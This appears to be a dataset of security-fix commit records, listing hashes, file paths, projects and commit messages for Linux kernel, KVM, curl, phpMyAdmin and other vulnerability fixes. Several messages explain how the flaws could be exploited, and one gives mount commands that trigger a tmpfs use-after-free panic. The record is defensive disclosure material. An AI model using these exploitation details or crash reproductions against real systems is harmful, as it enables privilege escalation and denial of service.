    dcb0ae374ca232f8092866422a86ef80be93de94
Blob(s) Before Fix: 
    dcb0ae374ca232f8092866422a86ef80be93de94
Projects:
    diversen_gallery
Commit Message for 7d58f870e8edc6597485dd1b80ea9fb78580190c:
escape possible shell args

======================================================================
Commit With Fix: 
    a8775aacf9e5c81cf11bec34b7afa7f27ddfe277
File(s) In Commit: 
    README.md
Blob(s) In Commit: 
    01d2c6ef35778884246227bca3ca909f3e345c6d
Blob(s) Before Fix: 
    01d2c6ef35778884246227bca3ca909f3e345c6d
Projects:
    4moms_dragonfly
Commit Message for a8775aacf9e5c81cf11bec34b7afa7f27ddfe277:
security update note

======================================================================
Commit With Fix: 
    6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0
File(s) In Commit: 
    net/core/sock_diag.c
Blob(s) In Commit: 
    750f44f3aa3117b578af1377ff07abb79032a612
Blob(s) Before Fix: 
    750f44f3aa3117b578af1377ff07abb79032a612
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0:
sock_diag: Fix out-of-bounds access to sock_diag_handlers[]\n\nUserland can send a netlink message requesting SOCK_DIAG_BY_FAMILY with a family greater or equal then AF_MAX -- the array size of sock_diag_handlers[]. The current code does not test for this condition therefore is vulnerable to an out-of-bound access opening doors for a privilege escalation.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5f00110f7273f9ff04ac69a5f85bb535a4fd0987
File(s) In Commit: 
    mm/shmem.c
Blob(s) In Commit: 
    5e2ff592e3b89d41640b3ff9c69d25d0fe004be4
Blob(s) Before Fix: 
    5e2ff592e3b89d41640b3ff9c69d25d0fe004be4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 5f00110f7273f9ff04ac69a5f85bb535a4fd0987:
tmpfs: fix use-after-free of mempolicy object\n\nThe tmpfs remount logic preserves filesystem mempolicy if the mpol=M option is not specified in the remount request.  A new policy can be specified if mpol=M is given.\n\nBefore this patch remounting an mpol bound tmpfs without specifying mpol= mount option in the remount request would set the filesystem's mempolicy object to a freed mempolicy object.\n\nTo reproduce the problem boot a DEBUG_PAGEALLOC kernel and run:     # mkdir /tmp/x\n\n    # mount -t tmpfs -o size=100M,mpol=interleave nodev /tmp/x\n\n    # grep /tmp/x /proc/mounts     nodev /tmp/x tmpfs rw,relatime,size=102400k,mpol=interleave:0-3 0 0\n\n    # mount -o remount,size=200M nodev /tmp/x\n\n    # grep /tmp/x /proc/mounts     nodev /tmp/x tmpfs rw,relatime,size=204800k,mpol=??? 0 0         # note ? garbage in mpol=... output above\n\n    # dd if=/dev/zero of=/tmp/x/f count=1         # panic here\n\nPanic:     BUG: unable to handle kernel NULL pointer dereference at           (null)     IP: [<          (null)>]           (null)     [...]     Oops: 0010 [#1] SMP DEBUG_PAGEALLOC     Call Trace:       mpol_shared_policy_init+0xa5/0x160       shmem_get_inode+0x209/0x270       shmem_mknod+0x3e/0xf0       shmem_create+0x18/0x20       vfs_create+0xb5/0x130       do_last+0x9a1/0xea0       path_openat+0xb3/0x4d0       do_filp_open+0x42/0xa0       do_sys_open+0xfe/0x1e0       compat_sys_open+0x1b/0x20       cstar_dispatch+0x7/0x1f\n\nNon-debug kernels will not crash immediately because referencing the dangling mpol will not cause a fault.  Instead the filesystem will reference a freed mempolicy object, which will cause unpredictable behavior.\n\nThe problem boils down to a dropped mpol reference below if shmem_parse_options() does not allocate a new mpol:\n\n    config = *sbinfo     shmem_parse_options(data, &config, true)     mpol_put(sbinfo->mpol)     sbinfo->mpol = config.mpol  /* BUG: saves unreferenced mpol */\n\nThis patch avoids the crash by not releasing the mempolicy if shmem_parse_options() doesn't create a new mpol.\n\nHow far back does this issue go? I see it in both 2.6.36 and 3.3.  I did not look back further.\n\nSigned-off-by: Greg Thelen <gthelen@google.com> Acked-by: Hugh Dickins <hughd@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    1ee0a224bc9aad1de496c795f96bc6ba2c394811
File(s) In Commit: 
    drivers/usb/serial/io_ti.c
Blob(s) In Commit: 
    82afc4d6a327d6bdbebc4707507684c966f11f9f
Blob(s) Before Fix: 
    82afc4d6a327d6bdbebc4707507684c966f11f9f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1ee0a224bc9aad1de496c795f96bc6ba2c394811:
USB: io_ti: Fix NULL dereference in chase_port()\n\nThe tty is NULL when the port is hanging up. chase_port() needs to check for this.\n\nThis patch is intended for stable series. The behavior was observed and tested in Linux 3.2 and 3.7.1.\n\nJohan Hovold submitted a more elaborate patch for the mainline kernel.\n\n[   56.277883] usb 1-1: edge_bulk_in_callback - nonzero read bulk status received: -84 [   56.278811] usb 1-1: USB disconnect, device number 3 [   56.278856] usb 1-1: edge_bulk_in_callback - stopping read! [   56.279562] BUG: unable to handle kernel NULL pointer dereference at 00000000000001c8 [   56.280536] IP: [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.281212] PGD 1dc1b067 PUD 1e0f7067 PMD 0 [   56.282085] Oops: 0002 [#1] SMP [   56.282744] Modules linked in: [   56.283512] CPU 1 [   56.283512] Pid: 25, comm: khubd Not tainted 3.7.1 #1 innotek GmbH VirtualBox/VirtualBox [   56.283512] RIP: 0010:[<ffffffff8144e62a>]  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.283512] RSP: 0018:ffff88001fa99ab0  EFLAGS: 00010046 [   56.283512] RAX: 0000000000000046 RBX: 00000000000001c8 RCX: 0000000000640064 [   56.283512] RDX: 0000000000010000 RSI: ffff88001fa99b20 RDI: 00000000000001c8 [   56.283512] RBP: ffff88001fa99b20 R08: 0000000000000000 R09: 0000000000000000 [   56.283512] R10: 0000000000000000 R11: ffffffff812fcb4c R12: ffff88001ddf53c0 [   56.283512] R13: 0000000000000000 R14: 00000000000001c8 R15: ffff88001e19b9f4 [   56.283512] FS:  0000000000000000(0000) GS:ffff88001fd00000(0000) knlGS:0000000000000000 [   56.283512] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [   56.283512] CR2: 00000000000001c8 CR3: 000000001dc51000 CR4: 00000000000006e0 [   56.283512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [   56.283512] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [   56.283512] Process khubd (pid: 25, threadinfo ffff88001fa98000, task ffff88001fa94f80) [   56.283512] Stack: [   56.283512]  0000000000000046 00000000000001c8 ffffffff810578ec ffffffff812fcb4c [   56.283512]  ffff88001e19b980 0000000000002710 ffffffff812ffe81 0000000000000001 [   56.283512]  ffff88001fa94f80 0000000000000202 ffffffff00000001 0000000000000296 [   56.283512] Call Trace: [   56.283512]  [<ffffffff810578ec>] ? add_wait_queue+0x12/0x3c [   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28/0x28 [   56.283512]  [<ffffffff812ffe81>] ? chase_port+0x84/0x2d6 [   56.283512]  [<ffffffff81063f27>] ? try_to_wake_up+0x199/0x199 [   56.283512]  [<ffffffff81263a5c>] ? tty_ldisc_hangup+0x222/0x298 [   56.283512]  [<ffffffff81300171>] ? edge_close+0x64/0x129 [   56.283512]  [<ffffffff810612f7>] ? __wake_up+0x35/0x46 [   56.283512]  [<ffffffff8106135b>] ? should_resched+0x5/0x23 [   56.283512]  [<ffffffff81264916>] ? tty_port_shutdown+0x39/0x44 [   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28/0x28 [   56.283512]  [<ffffffff8125d38c>] ? __tty_hangup+0x307/0x351 [   56.283512]  [<ffffffff812e6ddc>] ? usb_hcd_flush_endpoint+0xde/0xed [   56.283512]  [<ffffffff8144e625>] ? _raw_spin_lock_irqsave+0x14/0x35 [   56.283512]  [<ffffffff812fd361>] ? usb_serial_disconnect+0x57/0xc2 [   56.283512]  [<ffffffff812ea99b>] ? usb_unbind_interface+0x5c/0x131 [   56.283512]  [<ffffffff8128d738>] ? __device_release_driver+0x7f/0xd5 [   56.283512]  [<ffffffff8128d9cd>] ? device_release_driver+0x1a/0x25 [   56.283512]  [<ffffffff8128d393>] ? bus_remove_device+0xd2/0xe7 [   56.283512]  [<ffffffff8128b7a3>] ? device_del+0x119/0x167 [   56.283512]  [<ffffffff812e8d9d>] ? usb_disable_device+0x6a/0x180 [   56.283512]  [<ffffffff812e2ae0>] ? usb_disconnect+0x81/0xe6 [   56.283512]  [<ffffffff812e4435>] ? hub_thread+0x577/0xe82 [   56.283512]  [<ffffffff8144daa7>] ? __schedule+0x490/0x4be [   56.283512]  [<ffffffff8105798f>] ? abort_exclusive_wait+0x79/0x79 [   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f/0x2f [   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f/0x2f [   56.283512]  [<ffffffff810570b4>] ? kthread+0x81/0x89 [   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c/0x5c [   56.283512]  [<ffffffff8145387c>] ? ret_from_fork+0x7c/0xb0 [   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c/0x5c [   56.283512] Code: 8b 7c 24 08 e8 17 0b c3 ff 48 8b 04 24 48 83 c4 10 c3 53 48 89 fb 41 50 e8 e0 0a c3 ff 48 89 04 24 e8 e7 0a c3 ff ba 00 00 01 00 <f0> 0f c1 13 48 8b 04 24 89 d1 c1 ea 10 66 39 d1 74 07 f3 90 66 [   56.283512] RIP  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.283512]  RSP <ffff88001fa99ab0> [   56.283512] CR2: 00000000000001c8 [   56.283512] ---[ end trace 49714df27e1679ce ]---\n\nSigned-off-by: Wolfgang Frisch <wfpub@roembden.net> Cc: Johan Hovold <jhovold@gmail.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    0da9dfdd2cd9889201bc6f6f43580c99165cd087
File(s) In Commit: 
    security/keys/process_keys.c
Blob(s) In Commit: 
    42defae1e161632e93b13b8194af1a30a09f2492
Blob(s) Before Fix: 
    42defae1e161632e93b13b8194af1a30a09f2492
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0da9dfdd2cd9889201bc6f6f43580c99165cd087:
keys: fix race with concurrent install_user_keyrings()\n\nThis fixes CVE-2013-1792.\n\nThere is a race in install_user_keyrings() that can cause a NULL pointer dereference when called concurrently for the same user if the uid and uid-session keyrings are not yet created.  It might be possible for an unprivileged user to trigger this by calling keyctl() from userspace in parallel immediately after logging in.\n\nAssume that we have two threads both executing lookup_user_key(), both looking for KEY_SPEC_USER_SESSION_KEYRING.\n\n	THREAD A			THREAD B 	===============================	=============================== 					==>call install_user_keyrings()  	if (!cred->user->session_keyring) 	==>call install_user_keyrings() 					... 					user->uid_keyring = uid_keyring  	if (user->uid_keyring) 		return 0  	<== 	key = cred->user->session_keyring [== NULL] 					user->session_keyring = session_keyring  	atomic_inc(&key->usage)  [oops]\n\nAt the point thread A dereferences cred->user->session_keyring, thread B hasn't updated user->session_keyring yet, but thread A assumes it is populated because install_user_keyrings() returned ok.\n\nThe race window is really small but can be exploited if, for example, thread B is interrupted or preempted after initializing uid_keyring, but before doing setting session_keyring.\n\nThis couldn't be reproduced on a stock kernel.  However, after placing systemtap probe on 'user->session_keyring = session_keyring ' that introduced some delay, the kernel could be crashed reliably.\n\nFix this by checking both pointers before deciding whether to return. Alternatively, the test could be done away with entirely as it is checked inside the mutex - but since the mutex is global, that may not be the best way.\n\nSigned-off-by: David Howells <dhowells@redhat.com> Reported-by: Mateusz Guzik <mguzik@redhat.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    c300aa64ddf57d9c5d9c898a64b36877345dd4a9
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    2ade60c254020c2f99fda1c6d35f2118d50a15da
Blob(s) Before Fix: 
    2ade60c254020c2f99fda1c6d35f2118d50a15da
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c300aa64ddf57d9c5d9c898a64b36877345dd4a9:
KVM: x86: fix for buffer overflow in handling of MSR_KVM_SYSTEM_TIME (CVE-2013-1796)\n\nIf the guest sets the GPA of the time_page so that the request to update the time straddles a page then KVM will write onto an incorrect page.  The write is done byusing kmap atomic to get a pointer to the page for the time structure and then performing a memcpy to that page starting at an offset that the guest controls.  Well behaved guests always provide a 32-byte aligned address, however a malicious guest could use this to corrupt host kernel memory.\n\nTested: Tested against kvmclock unit test.\n\nSigned-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    a2c118bfab8bc6b8bb213abfc35201e441693d55
File(s) In Commit: 
    virt/kvm/ioapic.c
Blob(s) In Commit: 
    5ba005c00e2f76998694d202eca68452600ee5bf
Blob(s) Before Fix: 
    5ba005c00e2f76998694d202eca68452600ee5bf
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a2c118bfab8bc6b8bb213abfc35201e441693d55:
KVM: Fix bounds checking in ioapic indirect register reads (CVE-2013-1798)\n\nIf the guest specifies a IOAPIC_REG_SELECT with an invalid value and follows that with a read of the IOAPIC_REG_WINDOW KVM does not properly validate that request.  ioapic_read_indirect contains an ASSERT(redir_index < IOAPIC_NUM_PINS), but the ASSERT has no effect in non-debug builds.  In recent kernels this allows a guest to cause a kernel oops by reading invalid memory.  In older kernels (pre-3.3) this allows a guest to read from large ranges of host memory.\n\nTested: tested against apic unit tests.\n\nSigned-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    a0e02933f5f7ce5f364fbad36a005f0a349f0696
File(s) In Commit: 
    ZeroClipboard.as
Blob(s) In Commit: 
    d973b18cb31516a5489758d16d7551940193c39a
Blob(s) Before Fix: 
    d973b18cb31516a5489758d16d7551940193c39a
Projects:
    0b10011_zeroclipboard
Commit Message for a0e02933f5f7ce5f364fbad36a005f0a349f0696:
escape fix becuse XSS risk like

======================================================================
Commit With Fix: 
    eb178619f930fa2ba2348de332a1ff1c66a31424
File(s) In Commit: 
    fs/xfs/xfs_buf.c
Blob(s) In Commit: 
    689d72655ea62183775946607096e75bf56d73bc
Blob(s) Before Fix: 
    689d72655ea62183775946607096e75bf56d73bc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for eb178619f930fa2ba2348de332a1ff1c66a31424:
xfs: fix _xfs_buf_find oops on blocks beyond the filesystem end\n\nWhen _xfs_buf_find is passed an out of range address, it will fail to find a relevant struct xfs_perag and oops with a null dereference. This can happen when trying to walk a filesystem with a metadata inode that has a partially corrupted extent map (i.e. the block number returned is corrupt, but is otherwise intact) and we try to read from the corrupted block address.\n\nIn this case, just fail the lookup. If it is readahead being issued, it will simply not be done, but if it is real read that fails we will get an error being reported.  Ideally this case should result in an EFSCORRUPTED error being reported, but we cannot return an error through xfs_buf_read() or xfs_buf_get() so this lookup failure may result in ENOMEM or EIO errors being reported instead.\n\nSigned-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Brian Foster <bfoster@redhat.com> Reviewed-by: Ben Myers <bpm@sgi.com> Signed-off-by: Ben Myers <bpm@sgi.com>

======================================================================
Commit With Fix: 
    864745d291b5ba80ea0bd0edcbe67273de368836
File(s) In Commit: 
    net/xfrm/xfrm_user.c
Blob(s) In Commit: 
    dac08e2a5a93e69648e3210b59a333d8c62195fb
Blob(s) Before Fix: 
    dac08e2a5a93e69648e3210b59a333d8c62195fb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 864745d291b5ba80ea0bd0edcbe67273de368836:
xfrm_user: return error pointer instead of NULL\n\nWhen dump_one_state() returns an error, e.g. because of a too small buffer to dump the whole xfrm state, xfrm_state_netlink() returns NULL instead of an error pointer. But its callers expect an error pointer and therefore continue to operate on a NULL skbuff.\n\nThis could lead to a privilege escalation (execution of user code in kernel context) if the attacker has CAP_NET_ADMIN and is able to map address 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    276bdb82dedb290511467a5a4fdbe9f0b52dce6f
File(s) In Commit: 
    net/dccp/ccid.h
Blob(s) In Commit: 
    fb85d371a8dec875a01205b22ef6ddef5e99d511
Blob(s) Before Fix: 
    fb85d371a8dec875a01205b22ef6ddef5e99d511
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 276bdb82dedb290511467a5a4fdbe9f0b52dce6f:
dccp: check ccid before dereferencing\n\nccid_hc_rx_getsockopt() and ccid_hc_tx_getsockopt() might be called with a NULL ccid pointer leading to a NULL pointer dereference. This could lead to a privilege escalation if the attacker is able to map page 0 and prepare it with a fake ccid_ops pointer.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Gerrit Renker <gerrit@erg.abdn.ac.uk> Cc: stable@vger.kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    726bc6b092da4c093eb74d13c07184b18c1af0f1
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    9ef5c7312e12c36c4a194acf507ff0962356567a
Blob(s) Before Fix: 
    9ef5c7312e12c36c4a194acf507ff0962356567a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 726bc6b092da4c093eb74d13c07184b18c1af0f1:
net/sctp: Validate parameter size for SCTP_GET_ASSOC_STATS\n\nBuilding sctp may fail with:\n\nIn function ‘copy_from_user’,     inlined from ‘sctp_getsockopt_assoc_stats’ at     net/sctp/socket.c:5656:20: arch/x86/include/asm/uaccess_32.h:211:26: error: call to     ‘copy_from_user_overflow’ declared with attribute error: copy_from_user()     buffer size is not provably correct\n\nif built with W=1 due to a missing parameter size validation before the call to copy_from_user.\n\nSigned-off-by: Guenter Roeck <linux@roeck-us.net> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    8d0c2d10dd72c5292eda7a06231056a4c972e4cc
File(s) In Commit: 
    fs/ext3/super.c
Blob(s) In Commit: 
    fb5120a5505c055b9de9e7b948713256329cf690
Blob(s) Before Fix: 
    fb5120a5505c055b9de9e7b948713256329cf690
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8d0c2d10dd72c5292eda7a06231056a4c972e4cc:
ext3: Fix format string issues\n\next3_msg() takes the printk prefix as the second parameter and the format string as the third parameter. Two callers of ext3_msg omit the prefix and pass the format string as the second parameter and the first parameter to the format string as the third parameter. In both cases this string comes from an arbitrary source. Which means the string may contain format string characters, which will lead to undefined and potentially harmful behavior.\n\nThe issue was introduced in commit 4cf46b67eb("ext3: Unify log messages in ext3") and is fixed by this patch.\n\nCC: stable@vger.kernel.org Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    c0f5ecee4e741667b2493c742b60b6218d40b3aa
File(s) In Commit: 
    drivers/usb/class/cdc-wdm.c
Blob(s) In Commit: 
    122d056d96d570c2d59762fda22e0e973ac081b5
Blob(s) Before Fix: 
    122d056d96d570c2d59762fda22e0e973ac081b5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c0f5ecee4e741667b2493c742b60b6218d40b3aa:
USB: cdc-wdm: fix buffer overflow\n\nThe buffer for responses must not overflow. If this would happen, set a flag, drop the data and return an error after user space has read all remaining data.\n\nSigned-off-by: Oliver Neukum <oliver@neukum.org> CC: stable@kernel.org Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    12176503366885edd542389eed3aaf94be163fdb
File(s) In Commit: 
    fs/compat_ioctl.c
Blob(s) In Commit: 
    4c6285fff598e1faf9bb471f8b3b5593db74b355
Blob(s) Before Fix: 
    4c6285fff598e1faf9bb471f8b3b5593db74b355
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 12176503366885edd542389eed3aaf94be163fdb:
fs/compat_ioctl.c: VIDEO_SET_SPU_PALETTE missing error check\n\nThe compat ioctl for VIDEO_SET_SPU_PALETTE was missing an error check while converting ioctl arguments.  This could lead to leaking kernel stack contents into userspace.\n\nPatch extracted from existing fix in grsecurity.\n\nSigned-off-by: Kees Cook <keescook@chromium.org> Cc: David Miller <davem@davemloft.net> Cc: Brad Spengler <spender@grsecurity.net> Cc: PaX Team <pageexec@freemail.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    715230a44310a8cf66fbfb5a46f9a62a9b2de424
File(s) In Commit: 
    drivers/net/ethernet/broadcom/tg3.c
Blob(s) In Commit: 
    17a972734ba746d9218df4bf025218a91ebee947
Blob(s) Before Fix: 
    17a972734ba746d9218df4bf025218a91ebee947
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 715230a44310a8cf66fbfb5a46f9a62a9b2de424:
tg3: fix length overflow in VPD firmware parsing\n\nCommit 184b89044fb6e2a74611dafa69b1dce0d98612c6 ("tg3: Use VPD fw version when present") introduced VPD parsing that contained a potential length overflow.\n\nLimit the hardware's reported firmware string length (max 255 bytes) to stay inside the driver's firmware string length (32 bytes). On overflow, truncate the formatted firmware string instead of potentially overwriting portions of the tg3 struct.\n\nhttp://cansecwest.com/slides/2013/PrivateCore%20CSW%202013.pdf\n\nSigned-off-by: Kees Cook <keescook@chromium.org> Reported-by: Oded Horovitz <oded@privatecore.com> Reported-by: Brad Spengler <spender@grsecurity.net> Cc: stable@vger.kernel.org Cc: Matt Carlson <mcarlson@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    79089c9bc02c82c15419fd9d6496b8781ae08a5a
File(s) In Commit: 
    tbl_gis_visualization.php
Blob(s) In Commit: 
    bd95b2e6c71438e1d10fafe43c3fe43468a2571e
Blob(s) Before Fix: 
    bd95b2e6c71438e1d10fafe43c3fe43468a2571e
Projects:
    007durgesh219_phpmyadmin
Commit Message for 79089c9bc02c82c15419fd9d6496b8781ae08a5a:
fix XSS reported by Janek Vind

======================================================================
Commit With Fix: 
    2eb8dcf26cb37f09cffe26909a646e702dbcab66
File(s) In Commit: 
    lib/cookie.c
Blob(s) In Commit: 
    a67204e6e27dc553c146fa1d4ad640c9c8e0fe7e
Blob(s) Before Fix: 
    a67204e6e27dc553c146fa1d4ad640c9c8e0fe7e
Projects:
    0ca_curl
Commit Message for 2eb8dcf26cb37f09cffe26909a646e702dbcab66:
cookie: fix tailmatching to prevent cross-domain leakage\n\nCookies set for 'example.com' could accidentaly also be sent by libcurl to the 'bexample.com' (ie with a prefix to the first domain name).\n\nThis is a security vulnerabilty, CVE-2013-1944.\n\nBug: http://curl.haxx.se/docs/adv_20130412.html

======================================================================
Commit With Fix: 
    92f28d973cce45ef5823209aab3138eb45d8b349
File(s) In Commit: 
    net/core/scm.c
Blob(s) In Commit: 
    2dc6cdaaae8abc5f31afa57a7ccf765cc978b6ac
Blob(s) Before Fix: 
    2dc6cdaaae8abc5f31afa57a7ccf765cc978b6ac
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 92f28d973cce45ef5823209aab3138eb45d8b349:
scm: Require CAP_SYS_ADMIN over the current pidns to spoof pids.\n\nDon't allow spoofing pids over unix domain sockets in the corner cases where a user has created a user namespace but has not yet created a pid namespace.\n\nCc: stable@vger.kernel.org Reported-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    9223dc6bfc50251a9a3cba0210e71be80fc38ecd
File(s) In Commit: 
    README.md
Blob(s) In Commit: 
    bb8bc808f82305571b16e464160f8463780f45ba
Blob(s) Before Fix: 
    bb8bc808f82305571b16e464160f8463780f45ba
Projects:
    0NtgO_mediaelement
Commit Message for 9223dc6bfc50251a9a3cba0210e71be80fc38ecd:
2.11.1 updates

======================================================================
Commit With Fix: 
    83f1b4ba917db5dc5a061a44b3403ddb6e783494
File(s) In Commit: 
    include/net/scm.h
Blob(s) In Commit: 
    b11708105681e04f5c24f7ed206f732e2c37dc02
Blob(s) Before Fix: 
    b11708105681e04f5c24f7ed206f732e2c37dc02
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 83f1b4ba917db5dc5a061a44b3403ddb6e783494:
net: fix incorrect credentials passing\n\nCommit 257b5358b32f ("scm: Capture the full credentials of the scm sender") changed the credentials passing code to pass in the effective uid/gid instead of the real uid/gid.\n\nObviously this doesn't matter most of the time (since normally they are the same), but it results in differences for suid binaries when the wrong uid/gid ends up being used.\n\nThis just undoes that (presumably unintentional) part of the commit.\n\nReported-by: Andy Lutomirski <luto@amacapital.net> Cc: Eric W. Biederman <ebiederm@xmission.com> Cc: Serge E. Hallyn <serge@hallyn.com> Cc: David S. Miller <davem@davemloft.net> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: "Eric W. Biederman" <ebiederm@xmission.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c5037dd6b82909efaaa8720e8cfa8bdb8b4a0edd
File(s) In Commit: 
    keystone/common/config.py
Blob(s) In Commit: 
    82c31e6d62048f14a2437566c50a3af54a384719
Blob(s) Before Fix: 
    82c31e6d62048f14a2437566c50a3af54a384719
Projects:
    08_keystone
Commit Message for c5037dd6b82909efaaa8720e8cfa8bdb8b4a0edd:
Mark LDAP password and admin_token secret\n\nAdd secret=True to LDAP password and admin_token of keystone configuration.\n\nFix bug #1172195\n\nChange-Id: I8ef7f705e3f6b374ff427c20eb761892d5146a75 (cherry picked from commit d43e2a51a1ed7adbed3c5ddf001d46bc4a824ae8)

======================================================================
Commit With Fix: 
    0e9a9a1ad619e7e987815d20262d36a2f95717ca
File(s) In Commit: 
    fs/ext4/namei.c
Blob(s) In Commit: 
    8990165346ee6aa01a7f9a3264a092fc9669e85b
Blob(s) Before Fix: 
    8990165346ee6aa01a7f9a3264a092fc9669e85b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0e9a9a1ad619e7e987815d20262d36a2f95717ca:
ext4: avoid hang when mounting non-journal filesystems with orphan list\n\nWhen trying to mount a file system which does not contain a journal, but which does have a orphan list containing an inode which needs to be truncated, the mount call with hang forever in ext4_orphan_cleanup() because ext4_orphan_del() will return immediately without removing the inode from the orphan list, leading to an uninterruptible loop in kernel code which will busy out one of the CPU's on the system.\n\nThis can be trivially reproduced by trying to mount the file system found in tests/f_orphan_extents_inode/image.gz from the e2fsprogs source tree.  If a malicious user were to put this on a USB stick, and mount it on a Linux desktop which has automatic mounts enabled, this could be considered a potential denial of service attack.  (Not a big deal in practice, but professional paranoids worry about such things, and have even been known to allocate CVE numbers for such problems.)\n\nSigned-off-by: "Theodore Ts'o" <tytso@mit.edu> Reviewed-by: Zheng Liu <wenqing.lz@taobao.com> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    24ff855c82d3f5c62bc5788a5776cefbffce2971
File(s) In Commit: 
    libclamav/pdf.c
Blob(s) In Commit: 
    121fa01b4d091022e78d0e6421f65f5750407982
Blob(s) Before Fix: 
    121fa01b4d091022e78d0e6421f65f5750407982
Projects:
    0ca_clamav-devel
Commit Message for 24ff855c82d3f5c62bc5788a5776cefbffce2971:
pdf: bb #7053

======================================================================
Commit With Fix: 
    92c266170ce98edc200c656bd034a237098b8aa5
File(s) In Commit: 
    hawtjni-runtime/src/main/java/org/fusesource/hawtjni/runtime/Library.java
Blob(s) In Commit: 
    422bd2fc248fc5167fd72b1e9d05e77a82bccb4a
Blob(s) Before Fix: 
    422bd2fc248fc5167fd72b1e9d05e77a82bccb4a
Projects:
    JianpingZeng_hawtjni
Commit Message for 92c266170ce98edc200c656bd034a237098b8aa5:
Simplify shared lib extraction.

======================================================================
Commit With Fix: 
    929473ea05db455ad88cdc081f2adc556b8dc48f
File(s) In Commit: 
    drivers/usb/chipidea/host.c
Blob(s) In Commit: 
    8e9d31277c436ecce3fdd61ccb78031148a3e53e
Blob(s) Before Fix: 
    8e9d31277c436ecce3fdd61ccb78031148a3e53e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 929473ea05db455ad88cdc081f2adc556b8dc48f:
